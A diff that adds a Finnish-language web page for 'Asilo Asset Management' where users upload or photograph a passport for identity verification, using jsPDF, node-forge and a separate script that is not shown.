@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="fi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Asilo Asset Management - Henkilöllisyystodistus</title>
+    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles3.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+</head>
+<body>
+    <h2>Henkilöllisyystodistuksen Lataaminen</h2>
+    <div class="upload-box">
+        <form id="page3Form">
+            <div class="upload-section">
+                <div class="capture-options">
+                    <button type="button" id="cameraButton" class="option-button">
+                        Käytä kameraa
+                    </button>
+                    <span class="option-divider">tai</span>
+                    <label for="passport" class="option-button">
+                        Valitse tiedosto
+                    </label>
+                </div>
+                
+                <input type="file" 
+                       id="passport" 
+                       name="passport" 
+                       accept=".png,.jpg,.jpeg,.pdf" 
+                       style="display: none;">
+                
+                <!-- Hidden input for validation -->
+                <input type="hidden" id="hasDocument" name="hasDocument" required>
+                
+                <!-- Camera UI -->
+                <div id="cameraUI" style="display: none;">
+                    <video id="camera" autoplay playsinline></video>
+                    <canvas id="canvas" style="display: none;"></canvas>
+                    <div class="camera-controls">
+                        <button type="button" id="captureButton" class="camera-button">Ota kuva</button>
+                        <button type="button" id="retakeButton" class="camera-button" style="display: none;">Ota uusi kuva</button>
+                    </div>
+                </div>
+
+                <div id="preview" class="preview-section"></div>
+            </div>
+            <div class="proceed-button">
+                <button type="submit" id="proceedButton" disabled>Lähetä</button>
+            </div>
+        </form>
+    </div>
+    <div id="successBanner" class="success-banner">
+        Passi vastaanotettu
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/forge/0.10.0/forge.min.js"></script>
+    <script src="page3c.js"></script>
+</body>
+</html>
